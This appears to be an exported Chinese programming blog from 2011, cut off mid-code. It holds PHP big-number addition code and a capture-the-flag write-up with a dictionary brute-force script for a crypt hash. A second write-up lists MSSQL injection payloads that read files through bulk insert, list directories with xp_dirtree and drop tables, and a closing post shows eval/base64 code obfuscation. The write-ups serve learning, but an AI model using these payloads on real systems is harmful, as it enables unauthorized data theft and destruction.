$res[$i-1] -= 1;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }&nbsp;else{$res[$i-1]=0;&nbsp;}}&nbsp; &nbsp; } &nbsp;&nbsp; &nbsp; ksort($res);//按键名从低到高进行排列 &nbsp;&nbsp; &nbsp;($strd or implode(’’,$res)==0)?$res = implode(’’,$res):$res=”-“ . implode(’’,$res); //数组转换成字符串&nbsp;&nbsp; &nbsp; return $res; &nbsp;} &nbsp;?&gt;]]></content>
      <categories>
        <category>PHP|MYSQL学习</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>da</tag>
        <tag>大数计算</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php大数加法代码修改]]></title>
    <url>%2F2011%2F11%2F08%2Fphp%E5%A4%A7%E6%95%B0%E5%8A%A0%E6%B3%95%E4%BB%A3%E7%A0%81%E4%BF%AE%E6%94%B9%2F</url>
    <content type="text"><![CDATA[&nbsp; &nbsp; &nbsp;前段时间百度大数加法php代码没有百度到，今天一试竟然有了，发现了段，两段或多或少都有写小瑕疵！虽然不影响结果，但是为了奉行没有最好只有更好的理念！我对他进行了小的改动！ 第一段 转至：http://blog.csdn.net/youngerchen/article/details/6103595 &nbsp; &lt;?php &nbsp;$big1 = ’2036465424168354343213213213213213324654654’; &nbsp;$big2 = ’654657861324184354135435654165432165131321321321651351351351351351351351351351’; &nbsp;echo strAdd($big1,$big2); &nbsp;&nbsp;&nbsp;function strAdd($str1,$str2){ &nbsp;&nbsp; &nbsp; $res = array(); &nbsp;&nbsp; &nbsp; if(strlen($str1) &gt; strlen($str2)){ &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; $str2 = str_pad($str2,strlen($str1),’0’,STR_PAD_LEFT); &nbsp;&nbsp; &nbsp; } &nbsp;&nbsp; &nbsp; else{ &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; $str1 = str_pad($str1,strlen($str2),’0’,STR_PAD_LEFT); &nbsp;&nbsp; &nbsp; } &nbsp;&nbsp; &nbsp; for($i = strlen($str1)-1; $i&gt;=0; $i–){ &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; $tmp = $str1[$i] + $str2[$i]; &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; $res[$i] += $tmp; &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; if($res[$i] &gt;= 10) { &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $res[$i] -= 10; &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $res[$i-1] += 1; &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; } &nbsp;&nbsp; &nbsp; } &nbsp;&nbsp; &nbsp; ksort($res); &nbsp;&nbsp; &nbsp; $res = implode(’’,$res); &nbsp;&nbsp; &nbsp; return $res; &nbsp;} &nbsp;?&gt; &nbsp;———————————————因为他没有对数组赋初值就进行相加处理，所以会有警告出现！改动版：&nbsp;&lt;?php &nbsp;$big1 = ’9999999999999999999999999999999999999’; $big2 = ’999999999999999999999999999999999999999’; &nbsp;echo strAdd($big1,$big2).”&lt;br/&gt;”; &nbsp;&nbsp;&nbsp;function strAdd($str1,$str2){ &nbsp;&nbsp; &nbsp; $res = array(); //字符串长度处理&nbsp; &nbsp; if(strlen($str1) &gt; strlen($str2)){ &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; $str2 = str_pad($str2,strlen($str1),’0’,STR_PAD_LEFT);&nbsp; //string str_pad ( string $input , int $pad_length [, string $pad_string = “ “ [, int $pad_type = STR_PAD_RIGHT ]] )&nbsp;&nbsp; &nbsp; } &nbsp;&nbsp; &nbsp; else{ &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; $str1 = str_pad($str1,strlen($str2),’0’,STR_PAD_LEFT); &nbsp;&nbsp; &nbsp; } &nbsp; //数组元素循环相加和进位处理&nbsp; &nbsp; for($i = strlen($str1)-1,$res[$i]=0; $i&gt;=0; $i–){ &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; $tmp = $str1[$i] + $str2[$i]; &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; $res[$i] += $tmp; &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; if($res[$i] &gt;= 10) { &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $res[$i] -= 10; $res[$i-1]=0;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $res[$i-1] += 1; &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; } else{ $res[$i-1]=0; }&nbsp; &nbsp; } &nbsp;&nbsp; &nbsp; ksort($res);//按键名从低到高进行排列 &nbsp;&nbsp; &nbsp; $res[-1]==0?$res=substr(implode(’’,$res),1):$res = implode(’’,$res); //数组转换成字符串&nbsp;&nbsp; &nbsp; return $res; &nbsp;} &nbsp;?&gt; &nbsp; &nbsp;]]></content>
      <categories>
        <category>PHP|MYSQL学习</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[大数加法计算php代码]]></title>
    <url>%2F2011%2F11%2F03%2F%E5%A4%A7%E6%95%B0%E5%8A%A0%E6%B3%95%E8%AE%A1%E7%AE%97php%E4%BB%A3%E7%A0%81%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp;&nbsp; 前几天，百度了下看见大数计算基本都是c/c++、vb的代码，于是乎我想啊！我用php试试！就这个的写了这段加法代码，php新手，高手很看了代码不要嘲笑！这段代码基本都是自己想的没有参照任何代码！如有雷同纯属巧合！ &nbsp;&nbsp;&nbsp;&nbsp; 本来打算是写四则运算的代码的，哎！一段加法的就把我弄的够呛??????? &lt;?php $str_1=trim(’22222222222222222222222’);//输入数字 $str_2=trim(’999999999999999999999999999999999’);//输入数字 $i_1=strlen($str_1); $i_2=strlen($str_2); if($i_1&lt;=$i_2) { &nbsp;$ii=$i_2; &nbsp;$iii=$i_1; &nbsp;$str_1=str_repeat(’0’,$ii-$iii).$str_1; } else { &nbsp;$ii=$i_1; &nbsp;$iii=$i_2; &nbsp;$str_2=str_repeat(’0’,$ii-$iii).$str_2; } $str_mun1=str_split($str_1); $str_mun2=str_split($str_2); for($a=-1;$a&lt;$ii;$a++) { &nbsp;$str_mun[$a]=0; } for($i=$ii-1,$i_3=false;$i&gt;=0;$i–) { &nbsp;isset($str_mun1[$i])?:$str_mun1[$i]=0; &nbsp;isset($str_mun2[$i])?:$str_mun2[$i]=0; &nbsp;$str_mun3[$i]=(int)$str_mun1[$i]+(int)$str_mun2[$i]; &nbsp;$str_mun3[$i]=$str_mun3[$i]+$str_mun[$i]; &nbsp;if($str_mun3[$i]&gt;=10) &nbsp;{ &nbsp;&nbsp;$str_mun[$i]=$str_mun3[$i]-10; &nbsp;&nbsp;$i_3=true; &nbsp;} &nbsp;else &nbsp;{ &nbsp;&nbsp;$str_mun[$i]=$str_mun3[$i]; &nbsp;} &nbsp;if($i_3) &nbsp;{ &nbsp;&nbsp;$str_mun[$i-1]=$str_mun[$i-1]+1; &nbsp;&nbsp;$i_3=false;&nbsp; &nbsp;}&nbsp; } if($str_mun[-1]==0) { &nbsp;echo substr(implode(’’,$str_mun),1).”“; } else { &nbsp;echo implode(’’,$str_mun).”“; } ?&gt; ps：自己都感觉代码写的很乱，没有什么章法！]]></content>
      <categories>
        <category>PHP|MYSQL学习</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>大数计算</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP的构造函数和析构函数]]></title>
    <url>%2F2011%2F10%2F30%2FPHP%E7%9A%84%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0%E5%92%8C%E6%9E%90%E6%9E%84%E5%87%BD%E6%95%B0%2F</url>
    <content type="text"><![CDATA[class hanshu { &nbsp;//构造函数 &nbsp;function _construct&nbsp;() &nbsp;&nbsp;&nbsp;&nbsp;{ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //代码 &nbsp;&nbsp;&nbsp;&nbsp;}&nbsp; //析构函数 function _destruct() &nbsp;&nbsp;&nbsp;&nbsp;{ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//代码 &nbsp;&nbsp;&nbsp;&nbsp;} } &nbsp; 在这个类中名字为_construct 的函数叫做构造函数，每次new新建一个类的对象的时候就会执行此函数！ 类中的_destruct的函数叫做析构函数，每次unset一个对象的时候就会执行该函数！ &nbsp;]]></content>
      <categories>
        <category>PHP|MYSQL学习</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>函数</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[和linux用户加密有关的破解题]]></title>
    <url>%2F2011%2F10%2F19%2F%E5%92%8Clinux%E7%94%A8%E6%88%B7%E5%8A%A0%E5%AF%86%E6%9C%89%E5%85%B3%E7%9A%84%E7%A0%B4%E8%A7%A3%E9%A2%98%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp;&nbsp; 学长出了一个和linux有关的题目，题目如下： 有一个这个密码： 9RWoDRRmQmSX.Hs9PIo6EB7RgJ32U6aqjyaAE6XpSwEpJtXeo58PuL1ae8R2zytU7hKjQxS1jDJrBO4KlaRb01。 前面的salt部分已经不在了。 但是我只知道在一个salt里面,手头还有一个密码字典.现在我要找出这个密钥的明文和salt跟这个密钥(总共就有3个字符串哦)中的所有字符的ASCII值的和。 这个和就是key咯 例如：找到的明文为”test”, salt为$6$rstbqyhe$; 那么求出test$$rstbqyhe$9RWoDRRmQmSX.Hs9PIo6EB7RgJ32U6aqjyaAE6XpSwEpJtXeo58PuL1ae8R2zytU7hKjQxS1jDJrBO4KlaRb01 &nbsp;所有字符的ascii值得到key keyword:shadow, crypt 他给个两个字典：一个是密码明文的字典，一个是salt的字典，群里的大牛们都是c语言写的暴力破解代码，小菜c学的差，就会点php，所以就只有用php写了！ &lt;?php set_time_limit(0); $i=0; $j=false; $file1_name = fopen(“salt”,”r”); while(!feof($file1_name)) &nbsp; { &nbsp; &nbsp;&nbsp; $salt=trim(fgets($file1_name)); &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo $salt;echo ““; &nbsp; &nbsp;&nbsp; $file_name = fopen(“data”,”r”); &nbsp; &nbsp;&nbsp; while(!feof($file_name)) &nbsp; &nbsp;&nbsp; { &nbsp; &nbsp;&nbsp; &nbsp;&nbsp; $pwd=trim(fgets($file_name)); &nbsp; &nbsp;&nbsp; &nbsp;&nbsp; echo $pwd;echo ““; &nbsp; &nbsp;&nbsp; &nbsp;&nbsp; $shandow=crypt($pwd,$salt); &nbsp; &nbsp;&nbsp; &nbsp;&nbsp; echo $shandow;echo ““; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $shandow1=$salt.”9RWoDRRmQmSX.Hs9PIo6EB7RgJ32U6aqjyaAE6XpSwEpJtXeo58PuL1ae8R2zytU7hKjQxS1jDJrBO4KlaRb01”; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo $shandow1;echo ““; &nbsp; &nbsp;&nbsp; &nbsp;&nbsp; if(strcmp($shandow,$shandow1)==0) &nbsp; &nbsp;&nbsp; &nbsp;&nbsp; { &nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; $j=true; &nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; echo “this is key”.”“.$pwd.$shandow .”“; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $key=$pwd.$shandow; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $len=strlen($key); &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for($ii=0,$sum=0;$ii&lt;$len;$ii++){ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ${“str”.$ii}=substr($key,$ii,1); &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ${“asc”.$ii}=ord(${“str”.$ii}); &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo ${“asc”.$ii}.” “; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $sum=$sum+${“asc”.$ii}; &nbsp;&nbsp;&nbsp;&nbsp; } &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo ““.”ok! The number is key:”.$sum; &nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; break; &nbsp; &nbsp;&nbsp; &nbsp;&nbsp; } &nbsp; &nbsp;&nbsp; &nbsp;&nbsp; echo $i=$i+1; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo ““; &nbsp; &nbsp;&nbsp; } &nbsp; &nbsp;&nbsp; fclose($file_name); &nbsp; &nbsp;&nbsp; if($j==true) &nbsp; &nbsp;&nbsp; { &nbsp; &nbsp;&nbsp; &nbsp;&nbsp; break; &nbsp; &nbsp;&nbsp; } &nbsp; } fclose($file1_name); ?&gt; ps：我博客访问量低，我木有漏题！]]></content>
      <categories>
        <category>PHP|MYSQL学习</category>
      </categories>
      <tags>
        <tag>破解</tag>
        <tag>exploit</tag>
        <tag>shadow</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于mssql注入的两个题目]]></title>
    <url>%2F2011%2F10%2F11%2F%E5%85%B3%E4%BA%8Emssql%E6%B3%A8%E5%85%A5%E7%9A%84%E4%B8%A4%E4%B8%AA%E9%A2%98%E7%9B%AE%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们学校三叶草工作室组织的极客大挑战，出了两个sql注入的题目，用的是sql server 2000的数据库。花了我两天，还和被人讨论才给弄出过关的key！ ——————————————————————————————————————&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp; 注入的框架是insert into web values(’a’,’b’);&nbsp; 在b的位置我们可以通过表单输入字符串并且输入的字符串可以显示在下面的网站中，相当于就是一个留言册，a的位置是被固定的自加id。 题目中没有给任何提示！ —————————————- 下面把做题中的语句记录下来，留作以后用： ’);select text from web ’);select&nbsp;id from web ’);insert into web(text) select DB_NAME(1);– ’);insert into Geek_Web45_DB.dbo.web(text) select name from Web400_Key.dbo.sysobjects where xtype=’U’;– ’);insert into Geek_Web45_DB.dbo.web(text) select&nbsp;id from Web400_Key.dbo.sysobjects where xtype=’U’;– ’);insert into Geek_Web45_DB.dbo.web(text) select name from Web400_Key.dbo.syscolumns where id=xxxxxxx;– ’);insert into Geek_Web45_DB.dbo.web(text) select ok from Web400_Key.dbo.key1;– ’);insert into Geek_Web45_DB.dbo.web(text) select substring((ok),25,30) from Web400_Key.dbo.key1;– ———————————- ’)drop table Geek_Temp.Geek_Web45.ln_test;create table Geek_Temp.Geek_Web45.ln_test(ln VARCHAR(100));– ’);insert into Geek_Temp.Geek_Web45.ln_test values(’lnlnln’);– ’);bulk insert Geek_Temp.Geek_Web45.ln_test from ’C:W3B500_KeyW3B500_Keykey2.asp’ with (FIELDTERMINATOR=’,’,ROWTERMINATOR=’’);– ’);insert into Geek_Web45_DB.dbo.web(text) select ln from Geek_Temp.Geek_Web45.ln_test;– ’);drop table Geek_Temp.dbo.ln1_test_table;create table Geek_Temp.dbo.ln1_test_table(mulu VARCHAR(100),lujing VARCHAR(100),[file] VARCHAR(100)) Insert Geek_Temp.dbo.ln1_test_table exec master..xp_dirtree”c:“,1,1;– **select APP_NAME ( ) –当前会话的应用程序 select @@ERROR&nbsp;&nbsp;&nbsp;&nbsp; –返回最后执行的 Transact-SQL 语句的错误代码(integer) select @@IDENTITY&nbsp;&nbsp;&nbsp; –返回最后插入的标识值 Select USER_NAME()&nbsp;&nbsp;&nbsp;&nbsp; –返回用户数据库用户名 select @@ERROR&nbsp;&nbsp;&nbsp; –返回最后执行的 Transact-SQL 语句的错误代码 Select @@CONNECTIONS&nbsp;&nbsp; –返回自上次SQL启动以来连接或试图连接的次数。 Select GETDATE() –当前时间 Select @@CPU_BUSY/100&nbsp;&nbsp; –返回自上次启动SQL 以来 CPU 的工作时间，单位为毫秒 USE tempdb Select @@DBTS&nbsp;&nbsp; –为当前数据库返回当前 timestamp 数据类型的值。这一 timestamp 值保证在数据库中是唯一的。 select @@IDENTITY –返回最后插入的标识值 Select @@IDLE&nbsp;&nbsp; –返回SQL自上次启动后闲置的时间，单位为毫秒 Select @@IO_BUSY&nbsp;&nbsp;&nbsp; –返回SQL自上次启动后用于执行输入和输出操作的时间，单位为毫秒 Select @@LANGID&nbsp;&nbsp;&nbsp; –返回当前所使用语言的本地语言标识符(ID)。 Select @@LANGUAGE&nbsp;&nbsp;&nbsp; –返回当前使用的语言名 Select @@LOCK_TIMEOUT&nbsp;&nbsp; –当前会话的当前锁超时设置，单位为毫秒。 Select @@MAX_CONNECTIONS&nbsp;&nbsp; –返回SQL上允许的同时用户连接的最大数。返回的数不必为当前配置的数值 EXEC sp_configure&nbsp;&nbsp; –显示当前服务器的全局配置设置 Select @@MAX_PRECISION –返回 decimal 和 numeric 数据类型所用的精度级别，即该服务器中当前设置的精度。默认最大精度38。 select @@OPTIONS&nbsp;&nbsp; –返回当前 SET 选项的信息。 Select @@PACK_RECEIVED&nbsp;&nbsp; –返回SQL自启动后从网络上读取的输入数据包数目。 Select @@PACK_SENT&nbsp;&nbsp; –返回SQ自上次启动后写到网络上的输出数据包数目。 Select @@PACKET_ERRORS&nbsp;&nbsp; –返回自SQL启动后，在SQL连接上发生的网络数据包错误数。 Select @@SERVERNAME –返回运行SQL服务器名称。 Select @@SERVICENAME –返回SQL正在其下运行的注册表键名 Select @@TIMETICKS –返回SQL服务器一刻度的微秒数 Select @@TOTAL_ERRORS&nbsp;&nbsp; –返回 SQL服务器自启动后，所遇到的磁盘读/写错误数。 Select @@TOTAL_READ&nbsp;&nbsp; –返回 SQL服务器自启动后读取磁盘的次数。 Select @@TOTAL_WRITE&nbsp;&nbsp; –返回SQL服务器自启动后写入磁盘的次数。 Select @@TRANCOUNT&nbsp;&nbsp; –返回当前连接的活动事务数。 Select @@VERSION&nbsp;&nbsp; –返回SQL服务器安装的日期、版本和处理器类型。** &nbsp; SQL2000系统表、存储过程、函数的功能介绍及应用 &lt;?XML:NAMESPACE PREFIX = O /&gt;&lt;o:p&gt;&nbsp;&lt;/o:p&gt;—-系统表————————————————————————————–虽然使用系统存储过程、系统函数与信息架构视图已经可以为我们提供了相当丰富的元数据信息，但是对于某些特殊的元数据信息，我们仍然需要直接对系统表进行查询。因为SQL Server 将所有数据库对象的信息均存放在系统表中，作为 SQL Server 的管理、开发人员，了解各个系统表的作用将有助于我们了解 SQL Server 的内在工作原理。SQL Server 的系统表非常多，其中最常用的与元数据查询有关的表有如下一些：&nbsp;系统表描述syscolumns存储每个表和视图中的每一列的信息以及存储过程中的每个参数的信息。syscomments存储包含每个视图、规则、默认值、触发器、CHECK 约束、DEFAULT 约束和存储过程的原始 SQL 文本语句。sysconstraints存储当前数据库中每一个约束的基本信息。sysdatabases存储当前服务器上每一个数据库的基本信息。sysindexes存储当前数据库中的每个索引的信息。sysobjects存储数据库内的每个对象（约束、默认值、日志、规则、存储过程等）的基本信息。sysreferences存储所有包括 FOREIGN KEY 约束的列。systypes存储系统提供的每种数据类型和用户定义数据类型的详细信息。将系统存储过程、系统函数、信息架构视图与系统表结合使用，可以方便地让我们获得所有需要的元数据信息。示例：1、 获得当前数据库所有用户表的名称。SELECT OBJECT_NAME (id)FROM sysobjectsWHERE xtype = ’U’ AND OBJECTPROPERTY (id, ’IsMSShipped’) = 0其中主要用到了系统表 sysobjects以及其属性 xtype，还有就是用到了 OBJECTPROPERTY 系统函数来判断是不是安装 SQL Server 的过程中创建的对象。2、 获得指定表上所有的索引名称SELECT name FROM sysindexesWHERE id = OBJECT_ID (’mytable’) AND indid &gt; 0—-系统存储过程—————————————————————————&lt;o:p&gt;&nbsp;&lt;/o:p&gt;系统存储过程描述sp_columns返回指定表或视图的列的详细信息。sp_databases返回当前服务器上的所有数据库的基本信息。sp_fkeys若参数为带有主键的表，则返回包含指向该表的外键的所有表；若参数为带有外键的表名，则返回所有同过主键/外键关系与该外键相关联的所有表。sp_pkeys返回指定表的主键信息。sp_server_info返回当前服务器的各种特性及其对应取值。sp_sproc_columns返回指定存储过程的的输入、输出参数的信息。sp_statistics返回指定的表或索引视图上的所有索引以及统计的信息。sp_stored_procedures返回当前数据库的存储过程列表，包含系统存储过程。sp_tables返回当前数据库的所有表和视图，包含系统表。&lt;o:p&gt;&nbsp;&lt;/o:p&gt;—-系统函数—————————————————————————————————-COLUMNPROPERTY返回有关列或过程参数的信息，如是否允许空值，是否为计算列等。COL_LENGTH返回指定数据库的指定属性值，如是否处于只读模式等。DATABASEPROPERTYEX返回指定数据库的指定选项或属性的当前设置，如数据库的状态、恢复模型等。OBJECT_ID返回指定数据库对象名的标识号OBJECT_NAME返回指定数据库对象标识号的对象名。OBJECTPROPERTY返回指定数据库对象标识号的有关信息，如是否为表，是否为约束等。fn_listextendedproperty返回数据库对象的扩展属性值，如对象描述、格式规则、输入掩码等。—-使用信息架构视图访问元数据—————————————————————————————————信息架构视图基于 SQL-92 标准中针对架构视图的定义，这些视图独立于系统表，提供了关于 SQL Server 元数据的内部视图。信息架构视图的最大优点是，即使我们对系统表进行了重要的修改，应用程序也可以正常地使用这些视图进行访问。因此对于应用程序来说，只要是符合 SQL-92 标准的数据库系统，使用信息架构视图总是可以正常工作的。常用的信息架构视图有以下一些：信息架构视图描述INFORMATION_SCHEMA .CHECK_CONSTRAINTS返回有关列或过程参数的信息，如是否允许空值，是否为计算列等。INFORMATION_SCHEMA .COLUMNS返回当前数据库中当前用户可以访问的所有列及其基本信息。INFORMATION_SCHEMA .CONSTRAINT_COLUMN_USAGE返回当前数据库中定义了约束的所有列及其约束名。INFORMATION_SCHEMA .CONSTRAINT_TABLE_USAGE返回当前数据库中定义了约束的所有表及其约束名。INFORMATION_SCHEMA .KEY_COLUMN_USAGE返回当前数据库中作为主键/外键约束的所有列。INFORMATION_SCHEMA .SCHEMATA返回当前用户具有权限的所有数据库及其基本信息。INFORMATION_SCHEMA .TABLES返回当前用户具有权限的当前数据库中的所有表或者视图及其基本信息。INFORMATION_SCHEMA .VIEWS返回当前数据库中的当前用户可以访问的视图及其所有者、定义等信息。由于这些信息架构都是以视图的方式存在的，因此我们可以很方便地获得并利用需要的信息。例如，我们要得到某个表有多少列，可以使用以下语句：SELECT COUNT(&amp;#42) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=’mytable’&nbsp;&nbsp;—-应用———————————————————————-–1：获取当前数据库中的所有用户表select Name from sysobjects where xtype=’u’ and status&gt;=0–2：获取某一个表的所有字段select name from syscolumns where id=object_id(N’表名’)–3：查看与某一个表相关的视图、存储过程、函数select a.&amp;#42 from sysobjects a, syscomments b where a.id = b.id and b.text like N’%表名%’–4：查看当前数据库中所有存储过程select name as 存储过程名称 from sysobjects where xtype=’P’–5：查询用户创建的所有数据库select &amp;#42 from master..sysdatabases D where sid not in(select sid from master..syslogins where name=’sa’)或者select dbid, name AS DB_NAME from master..sysdatabases where sid &lt;&gt; 0x01–6：查询某一个表的字段和数据类型select column_name,data_type from information_schema.columnswhere table_name = N’表名’ –7:获取数据库文件路径select ltrim(rtrim(filename)) from 数据库名..sysfiles where charindex(’MDF’,filename)&gt;0orselect ltrim(rtrim(filename)) from 数据库名..sysfiles where charindex(’LDF’,filename)&gt;0–8:获取某一个表的基本信息sp_MShelpcolumns N’表名’–9:获取某一个表的主键、外键信息exec sp_pkeys N’表名’exec sp_fkeys&nbsp; N’表名’–10:判断某一个表是否存在某一列(字段)if exists(select 1 from syscolumns where id=object_id(N’表名) and name=N’字段’)&nbsp;&nbsp;&nbsp; print&nbsp; N’存在’else&nbsp;&nbsp;&nbsp; print&nbsp; N’不存在’&nbsp;下面给出了一个存储过程，它的作用是自动将当前数据库的用户存储过程加密。DECLARE @sp_name nvarchar(400)DECLARE @sp_content nvarchar(2000)DECLARE @asbegin intdeclare @now datetimeselect @now = getdate()DECLARE sp_cursor CURSOR FOR SELECT object_name(id)FROM sysobjectsWHERE xtype = ’P’ AND type = ’P’ AND crdate &lt; @nowAND OBJECTPROPERTY(id, ’IsMSShipped’)=0OPEN sp_cursorFETCH NEXT FROM sp_cursor INTO @sp_nameWHILE @@FETCH_STATUS = 0BEGINSELECT @sp_content = text FROM syscomments WHERE id = OBJECT_ID(@sp_name) SELECT @asbegin = PATINDEX ( ’%AS’ + char(13) + ’%’, @sp_content) SELECT @sp_content = SUBSTRING(@sp_content, 1, @asbegin - 1) + ’ WITH ENCRYPTION AS’+ SUBSTRING (@sp_content, @asbegin+2, LEN(@sp_content))SELECT @sp_name = ’DROP PROCEDURE [’ + @sp_name + ’]’EXEC sp_executesql @sp_name EXEC sp_executesql @sp_contentFETCH NEXT FROM sp_cursor INTO @sp_nameENDCLOSE sp_cursor DEALLOCATE sp_cursor该存储过程利用了 sysobjects 和 syscomments 表，并巧妙地修改了原存储过程的 SQL 定义语句，将 AS 修改为了 WITH ENCRYPTION AS，从而达到了加密存储过程的目的。本存储过程在 SQL Server 2000 上通过。]]></content>
      <categories>
        <category>SQLServer</category>
      </categories>
      <tags>
        <tag>注入</tag>
        <tag>mssql</tag>
        <tag>sqlserver2000</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[两种php源码加密代码]]></title>
    <url>%2F2011%2F10%2F07%2F%E4%B8%A4%E7%A7%8Dphp%E6%BA%90%E7%A0%81%E5%8A%A0%E5%AF%86%E4%BB%A3%E7%A0%81%2F</url>
    <content type="text"><![CDATA[第一种： &lt;?php function encode_file_contents($filename) { $type=strtolower(substr(strrchr($filename,’.’),1)); if(’php’==$type &amp;&amp; is_file($filename) &amp;&amp; is_writable($filename)){// 如果是PHP文件 并且可写 则进行压缩编码 $contents = file_get_contents($filename);// 判断文件是否已经被编码处理 $contents = php_strip_whitespace($filename); // 去除PHP头部和尾部标识 $headerPos = strpos($contents,’&lt;?php’); $footerPos = strrpos($contents,’?&gt;’); $contents = substr($contents,$headerPos+5,$footerPos-$headerPos); $encode = base64_encode(gzdeflate($contents));// 开始编码 $encode = ’&lt;?php’." eval(gzinflate(base64_decode("."’".$encode."’"."))); ?&gt;"; return file_put_contents($filename,$encode); } return false; } //调用函数 $filename=’dam.php’; encode_file_contents($filename); echo "OK,加密完成！" ?&gt; &nbsp; 第二种： &lt;?php function RandAbc($length=""){//返回随机字符串 $str="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"; return str_shuffle($str); } $filename=’dam.php’; $T_k1=RandAbc();//随机密匙1 $T_k2=RandAbc();//随机密匙2 $vstr=file_get_contents($filename);//要加密的文件 $v1=base64_encode($vstr); $c=strtr($v1,$T_k1,$T_k2);//根据密匙替换对应字符。 $c=$T_k1.$T_k2.$c; $q1="O00O0O"; $q2="O0O000"; $q3="O0OO00"; $q4="OO0O00"; $q5="OO0000"; $q6="O00OO0"; 